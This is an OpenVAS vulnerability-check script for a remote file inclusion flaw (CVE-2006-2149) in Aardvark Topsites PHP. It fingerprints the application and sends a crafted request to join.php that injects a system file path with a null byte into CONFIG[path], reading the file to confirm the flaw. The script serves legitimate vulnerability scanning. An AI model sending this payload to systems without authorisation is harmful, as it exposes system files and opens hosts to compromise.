# OpenVAS Vulnerability Test
# Description: Aardvark Topsites <= 4.2.2 Remote File Inclusion Vulnerability
#
# Authors:
# Ferdy Riphagen <f[dot]riphagen[at]nsec[dot]nl>
#
# Copyright:
# Copyright (C) 2008 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# Original advisory / discovered by :
# http://milw0rm.com/exploits/1732

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.200005");
  script_version("2021-04-16T06:57:08+0000");
  script_tag(name:"last_modification", value:"2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_cve_id("CVE-2006-2149");
  script_xref(name:"OSVDB", value:"25158");
  script_name("Aardvark Topsites <= 4.2.2 Remote File Inclusion Vulnerability");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2008 Ferdy Riphagen");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"solution", value:"Disable PHP's 'register_globals' or upgrade to the latest release.");

  script_tag(name:"summary", value:"The remote system contains a PHP application that is prone to
  remote file inclusions attacks.

  Description :

  Aardvark Topsites PHP is installed on the remote host. It is
  an open source Toplist management system written in PHP.

  The application does not sanitize user-supplied input to
  the 'CONFIG[PATH]' variable in some PHP files. This allows
  an attacker to include arbitrary files from remote systems, and
  execute them with privileges under which the webserver operates.

  The flaw is exploitable if PHP's 'register_globals' is set to on.");
  script_xref(name:"URL", value:"http://secunia.com/advisories/19911/");
  script_xref(name:"URL", value:"http://www.aardvarktopsitesphp.com/forums/viewtopic.php?t=4301");
  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port(default:80);
if (!http_can_host_php(port:port)) exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/topsites", "/aardvarktopsites", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if(res == NULL) continue;

  if (egrep(pattern:"Powered By <a href[^>]+>Aardvark Topsites PHP<", string:res)) {

    foreach pattern(keys(files)) {

      uri = "FORM[url]=1&CONFIG[captcha]=1&CONFIG[path]=";
      lfile = "/" + files[pattern];

      req = http_get(item:string(dir, "/sources/join.php?", uri, lfile, "%00"), port:port);
      recv = http_keepalive_send_recv(data:req, port:port, bodyonly:TRUE);
      if (recv == NULL) continue;

      if (egrep(pattern:pattern, string:recv) ||
          egrep(pattern:"Warning.+main\(" + lfile + "\\0\/.+failed to open stream", string:recv)) {
        security_message(port:port);
        exit(0);
      }
    }
  }
}

exit( 99 );
